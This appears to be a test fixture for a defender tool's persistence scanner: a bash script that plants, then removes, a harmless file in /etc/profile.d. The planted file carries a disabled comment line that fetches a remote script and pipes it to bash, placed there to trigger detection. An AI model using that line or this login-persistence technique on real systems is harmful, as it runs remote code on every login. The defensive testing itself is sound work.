#!/usr/bin/env bash
# Profile.d persistence: a script sourced on every interactive login.
# The active command is harmless; the suspicious patterns are in comments,
# which scan.rs matches against the full file text (not line-by-line).
# Detected by: defender-cli anti-persistence --startup-scripts
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

SCRIPT="/etc/profile.d/defender-test-update.sh"

case "${1:-}" in
  deploy)
    cat > "$SCRIPT" << 'EOF'
#!/bin/bash
# DEFENDER-TEST — simulated login persistence
# Payload (disabled): curl http://10.0.0.1/payload.sh | bash
/usr/bin/logger "defender-test: startup-script loaded" 2>/dev/null || true
EOF
    chmod 644 "$SCRIPT"
    echo "[+] 07_startup_script: $SCRIPT installed"
    ;;
  cleanup)
    rm -f "$SCRIPT"
    echo "[-] 07_startup_script: $SCRIPT removed"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
